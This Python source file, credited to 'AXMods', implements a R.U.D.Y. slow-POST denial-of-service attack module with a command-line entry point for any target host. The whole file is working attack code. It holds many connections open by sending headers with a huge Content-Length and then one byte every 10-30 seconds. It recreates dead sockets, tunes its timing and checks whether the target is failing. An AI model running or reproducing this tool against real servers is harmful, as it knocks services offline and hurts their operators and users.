#!/usr/bin/env python3
"""
R.U.D.Y. (R-U-Dead-Yet?) Attack Module
Method: Layer 7 Slow POST Attack
Author: AXMods
"""

import socket
import ssl
import random
import time
import threading
import sys
import os

# Add parent directory to path for imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils import get_random_user_agent, print_status, generate_random_string
from config import USER_AGENTS
from colorama import Fore, init

init(autoreset=True)

class RUDY:
    def __init__(self, target, port=80, sockets_count=100, duration=60, use_https=False, content_length=1000000):
        """
        Initialize R.U.D.Y. (Slow POST) Attack
        
        Args:
            target (str): Target hostname or IP
            port (int): Target port
            sockets_count (int): Number of slow POST connections
            duration (int): Attack duration in seconds
            use_https (bool): Use SSL/TLS for connection
            content_length (int): Content-Length header value (bytes to send slowly)
        """
        self.target = target.replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
        self.port = port
        self.sockets_count = sockets_count
        self.duration = duration
        self.use_https = use_https
        self.content_length = content_length  # Total bytes to send over time
        self.is_attacking = False
        
        # Socket management
        self.sockets = []
        self.socket_lock = threading.Lock()
        
        # Statistics
        self.active_sockets = 0
        self.total_sockets_created = 0
        self.sockets_recreated = 0
        self.bytes_sent = 0
        self.start_time = None
        
        # Attack configuration
        self.send_interval = random.randint(10, 30)  # Send 1 byte every 10-30 seconds
        self.reconnection_interval = 10  # Try to reconnect dead sockets every 10 seconds
        self.timeout = 15  # Socket timeout in seconds
        
        # Random form field names
        self.field_names = ['username', 'email', 'password', 'comment', 'message', 
                           'data', 'content', 'file', 'upload', 'submit']
        
    def _create_socket_and_send_headers(self):
        """Create socket and send initial POST headers (without completing request)"""
        try:
            # Create TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Connect to target
            sock.connect((self.target, self.port))
            
            # Wrap with SSL if needed
            if self.use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target)
            
            # Generate random form field
            field_name = random.choice(self.field_names)
            
            # Send POST headers with large Content-Length but don't send body yet
            headers = [
                f"POST / HTTP/1.1\r\n",
                f"Host: {self.target}\r\n",
                f"User-Agent: {get_random_user_agent()}\r\n",
                f"Content-Type: application/x-www-form-urlencoded\r\n",
                f"Content-Length: {self.content_length}\r\n",
                f"Connection: keep-alive\r\n",
                f"Accept: */*\r\n",
                f"\r\n"  # End of headers - body will be sent slowly later
            ]
            
            for header in headers:
                sock.send(header.encode())
            
            with self.socket_lock:
                self.sockets.append(sock)
                self.active_sockets += 1
                self.total_sockets_created += 1
            
            return sock, field_name
            
        except Exception as e:
            if 'sock' in locals():
                try:
                    sock.close()
                except:
                    pass
            return None, None
    
    def _slow_post_worker(self, sock, field_name):
        """Send POST body one byte at a time with long delays"""
        bytes_sent = 0
        form_data = f"{field_name}="
        
        # Send initial part of form data
        try:
            sock.send(form_data.encode())
            bytes_sent += len(form_data)
            
            while self.is_attacking and bytes_sent < self.content_length and sock in self.sockets:
                # Send one random byte of form data
                random_byte = random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
                sock.send(random_byte.encode())
                bytes_sent += 1
                
                with self.socket_lock:
                    self.bytes_sent += 1
                
                # Very long delay between bytes (this is the essence of R.U.D.Y.)
                time.sleep(random.uniform(self.send_interval - 5, self.send_interval + 5))
                
        except (socket.timeout, socket.error, ssl.SSLError, BrokenPipeError, ConnectionResetError):
            # Socket died
            with self.socket_lock:
                if sock in self.sockets:
                    self.sockets.remove(sock)
                    self.active_sockets -= 1
            try:
                sock.close()
            except:
                pass
        except Exception:
            # Any other error
            with self.socket_lock:
                if sock in self.sockets:
                    self.sockets.remove(sock)
                    self.active_sockets -= 1
            try:
                sock.close()
            except:
                pass
    
    def _socket_manager(self):
        """Manage socket pool - create new sockets to replace dead ones"""
        while self.is_attacking:
            with self.socket_lock:
                current_count = len(self.sockets)
            
            # Create new sockets if we're below target count
            if current_count < self.sockets_count:
                needed = self.sockets_count - current_count
                
                for _ in range(needed):
                    if not self.is_attacking:
                        break
                    
                    sock, field_name = self._create_socket_and_send_headers()
                    if sock and field_name:
                        # Start slow POST worker for this socket
                        thread = threading.Thread(
                            target=self._slow_post_worker, 
                            args=(sock, field_name), 
                            daemon=True
                        )
                        thread.start()
                        self.sockets_recreated += 1
            
            # Wait before checking again
            time.sleep(self.reconnection_interval)
    
    def _stats_monitor(self):
        """Monitor and display attack statistics"""
        self.start_time = time.time()
        
        while self.is_attacking:
            elapsed = time.time() - self.start_time
            minutes = int(elapsed // 60)
            seconds = int(elapsed % 60)
            
            with self.socket_lock:
                active = self.active_sockets
                total_created = self.total_sockets_created
                total_bytes = self.bytes_sent
                recreated = self.sockets_recreated
            
            # Calculate bytes per second
            bps = total_bytes / elapsed if elapsed > 0 else 0
            
            stats = (
                f"Active Sockets: {active}/{self.sockets_count} | "
                f"Bytes Sent: {total_bytes:,} | "
                f"Rate: {bps:.1f} B/s | "
                f"Time: {minutes:02d}:{seconds:02d}"
            )
            
            print_status(stats, Fore.YELLOW)
            time.sleep(3)
    
    def _connection_quality_monitor(self):
        """Monitor connection quality and adjust parameters"""
        while self.is_attacking:
            time.sleep(20)
            
            with self.socket_lock:
                active = self.active_sockets
            
            if active < self.sockets_count * 0.3:  # Less than 30% active
                print_status(f"Low socket retention ({active}/{self.sockets_count}) - increasing send interval", Fore.RED)
                self.send_interval = min(self.send_interval + 5, 60)  # Increase up to 60 seconds
            elif active > self.sockets_count * 0.8:  # More than 80% active
                print_status(f"Good socket retention ({active}/{self.sockets_count}) - attack effective", Fore.GREEN)
    
    def _target_health_check(self):
        """Periodically check if target is still responding"""
        while self.is_attacking:
            time.sleep(30)
            
            try:
                test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                test_socket.settimeout(5)
                test_socket.connect((self.target, self.port))
                
                # Send a quick request
                test_socket.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n\r\n")
                
                # Try to receive (but timeout quickly)
                test_socket.settimeout(2)
                try:
                    response = test_socket.recv(1024)
                    if response:
                        print_status("Target still responding to normal requests", Fore.CYAN)
                except socket.timeout:
                    print_status("Target not responding quickly (may be affected)", Fore.GREEN)
                
                test_socket.close()
                
            except Exception as e:
                print_status(f"Target may be down/unreachable: {str(e)[:50]}", Fore.RED)
    
    def start(self):
        """Start R.U.D.Y. (Slow POST) attack"""
        print_status(f"Starting R.U.D.Y. (Slow POST) attack...", Fore.RED)
        print_status(f"Target: {self.target}:{self.port}", Fore.WHITE)
        print_status(f"Sockets: {self.sockets_count}", Fore.WHITE)
        print_status(f"Duration: {self.duration} seconds", Fore.WHITE)
        print_status(f"Content-Length: {self.content_length:,} bytes", Fore.WHITE)
        print_status(f"HTTPS: {self.use_https}", Fore.WHITE)
        print_status(f"Send Interval: ~{self.send_interval} seconds per byte", Fore.WHITE)
        print_status("-" * 50, Fore.WHITE)
        
        self.is_attacking = True
        
        # Create initial socket pool
        print_status(f"Creating initial socket pool ({min(self.sockets_count, 30)} sockets)...", Fore.CYAN)
        
        initial_connections = []
        for i in range(min(self.sockets_count, 30)):  # Create 30 initially
            if not self.is_attacking:
                break
            
            sock, field_name = self._create_socket_and_send_headers()
            if sock and field_name:
                initial_connections.append((sock, field_name))
            
            # Small delay to avoid overwhelming
            if i % 5 == 0:
                time.sleep(0.5)
        
        print_status(f"Created {len(initial_connections)} initial connections", Fore.GREEN)
        
        # Start worker threads for initial connections
        for sock, field_name in initial_connections:
            thread = threading.Thread(
                target=self._slow_post_worker, 
                args=(sock, field_name), 
                daemon=True
            )
            thread.start()
        
        # Start management threads
        manager_thread = threading.Thread(target=self._socket_manager, daemon=True)
        stats_thread = threading.Thread(target=self._stats_monitor, daemon=True)
        quality_thread = threading.Thread(target=self._connection_quality_monitor, daemon=True)
        health_thread = threading.Thread(target=self._target_health_check, daemon=True)
        
        manager_thread.start()
        stats_thread.start()
        quality_thread.start()
        health_thread.start()
        
        # Run for specified duration
        try:
            for i in range(self.duration, 0, -1):
                if not self.is_attacking:
                    break
                
                if i % 15 == 0:
                    with self.socket_lock:
                        active = self.active_sockets
                        bytes_sent = self.bytes_sent
                    
                    remaining_connections = self.sockets_count - active
                    print_status(
                        f"Time: {i}s | Active: {active} | "
                        f"Bytes: {bytes_sent:,} | "
                        f"Need: {remaining_connections} more", 
                        Fore.MAGENTA
                    )
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print_status("Attack interrupted by user", Fore.YELLOW)
        
        # Stop attack
        self.is_attacking = False
        
        # Wait a moment for threads to notice
        time.sleep(3)
        
        # Close all sockets
        print_status("Closing all sockets...", Fore.CYAN)
        with self.socket_lock:
            for sock in self.sockets:
                try:
                    sock.close()
                except:
                    pass
            self.sockets.clear()
            self.active_sockets = 0
        
        # Final statistics
        elapsed = time.time() - self.start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        avg_bps = self.bytes_sent / elapsed if elapsed > 0 else 0
        
        print_status("-" * 50, Fore.WHITE)
        print_status("R.U.D.Y. ATTACK COMPLETED", Fore.RED)
        print_status(f"Total Sockets Created: {self.total_sockets_created:,}", Fore.GREEN)
        print_status(f"Total Bytes Sent: {self.bytes_sent:,}", Fore.YELLOW)
        print_status(f"Average Rate: {avg_bps:.2f} bytes/second", Fore.CYAN)
        print_status(f"Final Send Interval: {self.send_interval} seconds/byte", Fore.MAGENTA)
        print_status(f"Total Duration: {minutes:02d}:{seconds:02d}", Fore.WHITE)
        print_status(f"Target: {self.target}:{self.port}", Fore.WHITE)
        
        return {
            'total_sockets_created': self.total_sockets_created,
            'total_bytes_sent': self.bytes_sent,
            'average_bps': avg_bps,
            'final_send_interval': self.send_interval,
            'duration': elapsed,
            'target': f"{self.target}:{self.port}",
            'method': 'rudy'
        }

# Standalone test function
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="R.U.D.Y. (Slow POST) Attack Module")
    parser.add_argument("target", help="Target hostname or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
    parser.add_argument("-s", "--sockets", type=int, default=50, help="Number of sockets")
    parser.add_argument("-d", "--duration", type=int, default=45, help="Attack duration in seconds")
    parser.add_argument("--https", action="store_true", help="Use HTTPS")
    parser.add_argument("-c", "--content-length", type=int, default=1000000, 
                       help="Content-Length value (bytes to send slowly)")
    
    args = parser.parse_args()
    
    print(f"[*] Starting R.U.D.Y. test against {args.target}:{args.port}")
    print(f"[*] Sockets: {args.sockets}")
    print(f"[*] Duration: {args.duration}s")
    print(f"[*] HTTPS: {args.https}")
    print(f"[*] Content-Length: {args.content_length:,} bytes")
    print("-" * 50)
    
    attack = RUDY(
        target=args.target,
        port=args.port,
        sockets_count=args.sockets,
        duration=args.duration,
        use_https=args.https,
        content_length=args.content_length
    )
    
    try:
        results = attack.start()
        print(f"\n[+] Attack completed successfully!")
        print(f"Results: {results}")
    except KeyboardInterrupt:
        print(f"\n[!] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
